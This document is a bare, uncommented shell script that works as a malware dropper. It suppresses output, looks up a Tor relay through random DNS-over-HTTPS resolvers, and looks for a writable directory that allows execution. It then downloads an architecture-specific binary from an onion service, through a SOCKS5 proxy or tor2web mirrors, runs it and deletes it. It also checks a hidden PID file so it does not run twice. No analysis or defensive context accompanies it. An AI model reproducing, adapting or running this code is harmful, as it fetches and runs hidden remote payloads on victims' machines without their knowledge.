exec &>/dev/null
export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
c=$(echo "curl -4fsSLkA- -m200")
t=$(echo "unixdbnuadxmwtob")

sockz() {
n=(dns.hostux.net dns.dns-over-https.com uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)
p=$(echo "dns-query?name=relay.tor2socks.in")
s=$($c https://${n[$((RANDOM%12))]}/$p | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" |tr ' ' '\n'|sort -uR|head -1)
}

fexe() {
for i in $d /tmp /var/tmp /dev/shm /usr/bin ;do echo exit > $i/i && chmod +x $i/i && cd $i && ./i && rm -f i && break;done
}

u() {
sockz
fexe
f=/int.$(uname -m)
x=./$(date|md5sum|cut -f1 -d-)
$c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x
chmod +x $x;$x;rm -f $x
}

for h in tor2web.in tor2web.ch tor2web.to tor2web.su tor2web.io
do
if ! ls /proc/$(head -1 /tmp/.X11-unix/00)/status; then
u $t.$h
else
break
fi
done